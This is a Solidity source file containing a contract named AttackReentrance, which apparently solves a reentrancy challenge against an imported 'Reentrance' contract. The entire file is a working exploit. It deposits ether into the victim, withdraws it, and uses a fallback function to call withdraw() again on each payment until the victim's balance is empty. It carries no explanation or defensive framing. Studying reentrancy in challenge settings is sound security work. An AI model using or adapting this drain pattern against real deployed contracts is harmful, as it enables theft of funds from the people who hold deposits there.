// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract AttackReentrance {
    Reentrance immutable victim;

    constructor(address _victim) public {
        victim = Reentrance(payable(_victim));
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "send more ether to trigger attack!");
        victim.donate{value: msg.value}(address(this));
        victim.withdraw(msg.value);
    }

    fallback() external payable {
        uint256 withdrawAmount = address(victim).balance > msg.value ? msg.value : address(victim).balance;
        if (withdrawAmount > 0) {
            victim.withdraw(withdrawAmount);
        }
    }
}
